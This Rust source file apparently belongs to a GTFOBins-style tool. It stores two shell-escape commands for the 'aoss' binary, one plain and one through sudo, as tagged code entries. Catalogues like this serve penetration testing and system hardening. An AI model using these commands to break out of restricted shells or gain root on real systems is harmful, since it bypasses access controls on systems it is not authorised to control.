pub static BIN_NAME: &'static str = "aoss";
static SH_CODE: &'static str = r#"

    aoss /bin/sh
"#;
static SUDO_CODE: &'static str = r#"

    sudo aoss /bin/sh
"#;

use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code {
    title: "SHELL_CODE",
    code: SH_CODE,
    tag: Tag::SH,
};
pub static SUDO: Code<'static> = Code {
    title: "SUDO_CODE",
    code: SUDO_CODE,
    tag: Tag::SUDO,
};
